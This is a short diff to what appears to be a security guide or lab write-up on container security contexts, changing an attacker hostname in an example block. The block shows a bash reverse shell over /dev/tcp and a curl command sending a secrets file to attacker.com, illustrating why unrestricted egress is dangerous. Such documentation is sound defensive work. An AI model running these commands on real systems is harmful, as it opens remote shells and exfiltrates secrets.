@@ -138,7 +138,7 @@ securityContext:
 **Attack Exploitation**:
 ```bash
 # Reverse shell (works because egress not restricted)
-bash -i >& /dev/tcp/attacker.ctf.local/4444 0>&1
+bash -i >& /dev/tcp/attacker.sc.local/4444 0>&1
 
 # Data exfiltration (works because HTTPS egress allowed)
 curl -X POST -d @/tmp/secrets.json https://attacker.com/exfil
